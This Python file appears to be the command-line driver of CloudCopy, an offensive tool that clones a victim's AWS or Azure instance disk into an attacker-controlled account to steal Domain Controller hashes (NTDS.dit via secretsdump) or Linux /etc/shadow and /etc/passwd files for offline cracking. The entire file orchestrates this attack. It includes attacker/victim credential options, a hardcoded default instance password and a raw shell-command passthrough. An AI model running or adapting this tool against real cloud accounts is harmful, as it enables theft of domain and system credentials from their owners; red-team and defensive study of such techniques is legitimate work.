import cmd
import glob
import os
import re
import shlex

try:
    import readline
    # readline is weird on some systems
    if 'libedit' in readline.__doc__:
        readline.parse_and_bind("bind ^I rl_complete")
    else:
        readline.parse_and_bind("tab: complete")
except (ImportError, TypeError):
    import pyreadline as readline

from CloudCopyUtils import CloudCopyUtils
from AzureCloudCopy import *

# These might change, I'll probably forget to update it
REGIONS = ['us-east-2', 'us-east-1', 'us-west-1', 'us-west-2', 'ap-east-1',
           'ap-south-1', 'ap-northeast-2', 'ap-southeast-1', 'ap-southeast-2',
           'ap-northeast-1', 'ca-central-1', 'cn-north-1', 'cn-northwest-1',
           'eu-central-1', 'eu-west-1', 'eu-west-2', 'eu-west-3', 'eu-north-1',
           'sa-east-1', 'us-gov-east-1', 'us-gov-west-1']

AZURE_REGIONS = ['Central US', 'East US 2', 'East US', 'North Central US', 'South Central US', 'West US 2',
                 'West Central US', 'West US', 'Canada Central', 'Canada East', 'Brazil South']
'''
This class is the base command interpreter that handles the user input. 
Different attacks or modes extend this and add new commands.
'''
class BaseCmdInterpreter(cmd.Cmd):

    def __init__(self):
        self.options = {}
        super(BaseCmdInterpreter, self).__init__()

    def cmdloop(self, intro=None):
        return super(BaseCmdInterpreter, self).cmdloop()

    def do_shell(self, line):
        """Run a shell command"""
        output = os.popen(line).read()
        print(output)

    def do_exit(self, args):
        return True

    def emptyline(self):
        pass

    # helper for tab completing file paths when setting 'victimprofile/attackerprofile'. Expects ~/.aws/credentials file
    def _complete_profiles(self):
        from os.path import expanduser
        home = expanduser("~")
        credentials = open(home+"/.aws/credentials").read()
        profiles = re.findall('\[.+\]', credentials)
        return list(map(lambda x:x[1:-1], profiles))

    def _complete_azure_profiles(self, path):
        if os.path.isdir(path):
            return glob.glob(os.path.join(path, '*'))
        else:
            return glob.glob(path + '*')

    # lists results from previous 'stealDCHashes' attempt. If the 'secrets*' files have been moved this returns nothing
    def do_list_hashes(self, args):
        """list_hashes
        Display previously gained hashes"""
        secrets = glob.glob("./secrets*")
        if len(secrets) > 0:
            for secret in secrets:
                print(open(secret).read())
        else:
            print("no hashes found yet")

    def do_set(self, line):
        """set [property] [value]
        Set the CloudCopy properties"""
        arguments = [l for l in line.split()]
        if len(arguments) < 2:
            print("Not enough arguments")
        else:
            self.options[arguments[0]] = " ".join(arguments[1:])

    def printGap(self):
        print('---------------------------------------------------------')

    # auto complete helper for setting options
    def complete_set(self, text, line, begidx, endidx):
        options = self.options.keys()
        if 'azureregion' in line:
            if text:
                completions = [f
                               for f in AZURE_REGIONS
                               if f.startswith(text)
                               ]
            else:
                completions = AZURE_REGIONS
        elif 'authfile' in line:
            try:
                glob_prefix = line[:endidx]

                # add a closing quote if necessary
                quote = ['', '"', "'"]
                while len(quote) > 0:
                    try:
                        split = [s for s in shlex.split(glob_prefix + quote[0]) if s.strip()]
                    except ValueError as ex:
                        assert str(ex) == 'No closing quotation', 'Unexpected shlex error'
                        quote = quote[1:]
                    else:
                        break
                assert len(quote) > 0, 'Could not find closing quotation'

                # select relevant line segment
                glob_prefix = split[-1] if len(split) > 1 else ''

                # expand tilde
                glob_prefix = os.path.expanduser(glob_prefix)

                # find matches
                matches = glob.glob(glob_prefix + '*')

                # append os.sep to directories
                matches = [match + "/" if Path(match).is_dir() else match for match in matches]

                # cutoff prefixes
                cutoff_idx = len(glob_prefix) - len(text)
                matches = [match[cutoff_idx:].replace("\\", "/") for match in matches]

                return matches
            except:
                print("error while parsing file path")
        elif 'region' in line:
            if text:
                completions = [f
                               for f in REGIONS
                               if f.startswith(text)
                               ]
            else:
                completions = REGIONS
        elif 'Profile' in line:
            if text:
                completions = [f
                               for f in self._complete_profiles()
                               if f.startswith(text)]
            else:
                completions = self._complete_profiles()
        else:
            completions = [f
                           for f in options
                           if f.startswith(text)
                           ]
        return completions

    def do_show_options(self, args):
        """show_options
        Show CloudCopy properties and their currently set values"""
        for option in self.options:
            if self.options[option] != '':
                if option == 'attackeraccountid':
                    print(option + " = " + self.options[option][0:2] + "*" * 6 + self.options[option][-2:-1])
                elif 'Key' in option:
                    print(option + " = " + self.options[option][0:2] + "*" * 6 + self.options[option][-2:-1])
                else:
                    print(option + " = " + self.options[option])
            else:
                print(option + " = " + self.options[option])


'''
Generic CloudCopy class for Azure that the Service Principal access type extends from
'''


class BaseAzureCloudCopy(BaseCmdInterpreter):

    def __init__(self, parentOptions):
        BaseCmdInterpreter.__init__(self)
        self.cloudCopier = None
        self.options = parentOptions

    # runs the cleanup function manually so users have control of when the instance dies
    def do_cleanup(self, args):
        if self.cloudCopier:
            self.cloudCopier.cleanup()
        else:
            print("Nothing to cleanup")

    def initCloudCopy(self):
        if '' not in [value for key, value in self.options.items()]:
            try:
                print(self.options)
                self.cloudCopier = AzureCloudCopy(self.options)
                return self.cloneNewInstance()
            except Exception as e:
                print(e)
                print("Error creating instance or getting client")
                return False
        else:
            print("Your forgot to set some properties. Make sure that no properties in 'show_options' is set to '' ")
            return False

    def do_stealShadowPasswd(self, args):
        if self.initCloudCopy():
            self.cloudCopier.stealShadowPasswd()

    # steals SYSTEM and NTDS.dit file
    def do_stealDCHashes(self, args):
        if self.initCloudCopy():
            self.cloudCopier.stealDCHashFiles()

    # helper for performing the CloudCopy attack from scratch
    def cloneNewInstance(self):
        try:
            if self.cloudCopier.pickResourceGroup():
                self.printGap()
                if self.cloudCopier.pickVmToSteal():
                    self.printGap()
                    if self.cloudCopier.generateSnapshot():
                        self.printGap()
                        if self.cloudCopier.createVmWithSnapshot():
                            self.printGap()
                            return True
        except KeyboardInterrupt:
            print("User cancelled cloudCopy, cleaning up...")
            self.cloudCopier.cleanup()
        return False


'''
Generic CloudCopy class for AWS that the two access types extend off of
Both access methods use the same path to steal DC hashes what
changes is how you authenticate to AWS. Subclasses implement the
stealDHashes method to perform the authentication 
'''


class BaseAWSCloudCopy(BaseCmdInterpreter):

    def __init__(self, parentOptions):
        BaseCmdInterpreter.__init__(self)
        self.cloudCopier = None
        self.options = parentOptions

    # runs the cleanup function manually so users have control of when the instance dies
    def do_cleanup(self, args):
        if self.cloudCopier:
            self.cloudCopier.cleanup()
        else:
            print("Nothing to cleanup")

    def initCloudCopy(self):
        if '' not in [value for key, value in self.options.items()]:
            self.cloudCopier = CloudCopyUtils({
                'type': 'profile' if self.__class__.__name__ == 'ProfileCloudCopy' else 'manual',
                'options': self.options
            })
            try:
                self.cloudCopier.createBotoClient()
                return self.cloneNewInstance()
            except Exception as e:
                print(e)
                print("Error creating instance or getting client")
                self.cloudCopier.cleanup()
                return False
        else:
            print("Your forgot to set some properties. Make sure that no properties in 'show_options' is set to '' ")
            return False

    def do_stealShadowPasswd(self, args):
        if self.initCloudCopy():
            self.cloudCopier.stealShadowPasswd()

    # steals SYSTEM and NTDS.dit file
    def do_stealDCHashes(self, args):
        if self.initCloudCopy():
            self.cloudCopier.stealDCHashFiles()

    # helper for performing the CloudCopy attack from scratch
    def cloneNewInstance(self):
        try:
            if self.cloudCopier.listInstances():
                self.cloudCopier.printGap()
                if self.cloudCopier.createSnapshot():
                    self.cloudCopier.printGap()
                    if self.cloudCopier.modifySnapshot():  # inflection point here that can fail if they encrypt drives
                        self.cloudCopier.printGap()
                        if self.cloudCopier.createVPC():
                            self.cloudCopier.printGap()
                            if self.cloudCopier.createInternetGateway():
                                self.cloudCopier.printGap()
                                if self.cloudCopier.createSecurityGroup():
                                    self.cloudCopier.printGap()
                                    if self.cloudCopier.createSubnet():
                                        self.cloudCopier.printGap()
                                        if self.cloudCopier.createKeyPair():
                                            self.cloudCopier.printGap()
                                            if self.cloudCopier.createInstance():
                                                self.cloudCopier.printGap()
                                                return True
                    else:
                        print(
                            "The Domain Controller's volume is encrypted meaning we can't share the snapshots created "
                            "from it with the attacker controlled account. We can possibly continue by creating the "
                            "instance and security group on the victim account but this will create more AWS logs...")
                        onward = input(
                            "would you like to continue the CloudCopy attack using only the victim account? (Y/N)")
                        self.cloudCopier.printGap()
                        while onward not in ['y', 'Y', 'n', 'N']:
                            print("only input y,Y,n,N")
                            onward = input(
                                "would you like to continue the CloudCopy attack using only the victim account? (Y/N)")
                        if onward in ['y', 'Y']:
                            # These will all happen under the context of the victim account, Good luck and Godspeed
                            if self.cloudCopier.createVPC():
                                self.cloudCopier.printGap()
                                if self.cloudCopier.createInternetGateway():
                                    self.cloudCopier.printGap()
                                    if self.cloudCopier.createSecurityGroup():
                                        self.cloudCopier.printGap()
                                        if self.cloudCopier.createSubnet():
                                            self.cloudCopier.printGap()
                                            if self.cloudCopier.createKeyPair():
                                                self.cloudCopier.printGap()
                                                if self.cloudCopier.createInstance():
                                                    self.cloudCopier.printGap()
                                                    return True
                        else:
                            print("Sorry they encrypted their drives, better luck next time.")
                            self.cloudCopier.cleanup()
                else:
                    print("Snapshot failed being created. This is required for the attack. ")
                    self.cloudCopier.cleanup()
            else:
                print("Invalid ec2 instance id. ")
        except KeyboardInterrupt:
            print("User cancelled cloudCopy, cleaning up...")
            self.cloudCopier.cleanup()
        return False


'''
BaseAzureCloudCopy sub-class that uses Security Principle accounts to authenticate to Azure and perform CloudCopy
'''


class AzureSecPrincipleCloudCopy(BaseAzureCloudCopy):

    def __init__(self, parentOptions):
        super(AzureSecPrincipleCloudCopy, self).__init__(parentOptions)
        self.prompt = "(Azure SecProfile CloudCopy)"
        self.options['victimauthfile'] = '/Users/Tanner/victimcredentials.json'
        self.options['attackerauthfile'] = '/Users/Tanner/mycredentials.json'
        self.options['attackinstancepassword'] = 'Superleetsecret1!'
        self.options['azureregion'] = 'EAST US'

'''
BaseCloudCopy sub-class that uses .aws/credentials profiles to authenticate to AWS and perform CloudCopy
'''


class ProfileCloudCopy(BaseAWSCloudCopy):

    def __init__(self, parentOptions):
        super(ProfileCloudCopy, self).__init__(parentOptions)
        self.prompt = "(Profile CloudCopy)"
        self.options['attackerProfile'] = ''  # name of .aws/credentials profile that pertains to attacker account
        self.options['victimProfile'] = ''  # name of .aws/credentials profile that pertains to victim account
        self.options['region'] = ''  # AWS region for accessing the victim instance
        self.options[
            'attackeraccountid'] = ''  # the id of the attacker owned AWS account that is used to share the snapshot with


'''
BaseCloudCopy sub-class that uses user supplied credentials to authenticate to AWS and perform CloudCopy
'''


class ManualCloudCopy(BaseAWSCloudCopy):

    def __init__(self, parentOptions):
        super(ManualCloudCopy, self).__init__(parentOptions)
        self.prompt = "(Manual CloudCopy)"
        self.options['attackerAccessKey'] = ''  # AccessKey to attacker account
        self.options['attackerSecretKey'] = ''  # SecretKey to attacker account
        self.options['victimAccessKey'] = ''  # AccessKey to victim account
        self.options['victimSecretKey'] = ''  # SecretKey to attacker account
        self.options['region'] = ''  # AWS region for accessing the victim instance
        self.options[
            'attackeraccountid'] = ''  # the id of the attacker owned AWS account that is used to share the snapshot with


'''
BaseCmdInterpreter sub-class that adds CloudCopy attack commands
'''
class MainMenu(BaseCmdInterpreter):

    def __init__(self):
        super(MainMenu, self).__init__()
        self.usage()
        self.prompt = "(CloudCopy)"

    def usage(self):
            print("""CLOUDCOPY your one stop shop for stealing goodies from Cloud instances!
CLOUDCOPY uses a simple process of V_Instance->Snapshot->Volume->A_Instance 
to steal the hard drive of a victim instance and mount it to an attacker 
controlled box for pilfering. CLOUDCOPY has two main modes, Profile and Manual.
NOTICE: you must manually run "cleanup" to destroy the instances. CLOUDCOPY will only auto-clean when an error occurs
There are two modes for accessing AWS:
    Profile: Which uses the profiles in .aws/credentials file for authenticating
    Manual:  Which uses supplied Access/Secret keys of the Victim/Attacker for authenticating
For one attack path:
    StealDCHashes: This mode is meant to run against Domain Controllers in the cloud.
                    It copies the drive to a Linux system, extracts the ntds.dit and SYSTEM
                    files and uses Impacket's secretsdump to recreate the Domains hashes.
    StealShadowPasswd: This mode is meant to run against Linux servers. It steals the
                    /etc/shadow and /etc/passwd files for cracking offline.""")

    #helper to reset options when switching between attack types
    def reset_options(self):
        self.options = {'attackeraccountid': ''}

    #initiates profile based CloudCopy attack
    def do_profile_cloudcopy(self, args):
        """profile_cloudcopy
        CloudCopy attack using .aws/credential profiles to authenticate"""
        sub_cmd = ProfileCloudCopy(self.options)
        sub_cmd.cmdloop()
        self.reset_options()

    #initiates manual based CloudCopy attack
    def do_manual_cloudcopy(self, args):
        """manual_cloudcopy
        CloudCopy attack using manually set attacker/victim access/secret keys to authenticate"""
        sub_cmd = ManualCloudCopy(self.options)
        sub_cmd.cmdloop()
        self.reset_options()

    # initiates manual based Azure CloudCopy attack
    def do_azure_secprinciple_cloudcopy(self, args):
        """Azure_cloudcopy using security principle accounts
        CloudCopy attack using manually security principle accounts"""
        sub_cmd = AzureSecPrincipleCloudCopy(self.options)
        sub_cmd.cmdloop()
        self.reset_options()

if __name__ == '__main__':
    cmd = MainMenu()
    try:
        cmd.cmdloop()
    except KeyboardInterrupt:
        print("K. BYE!")
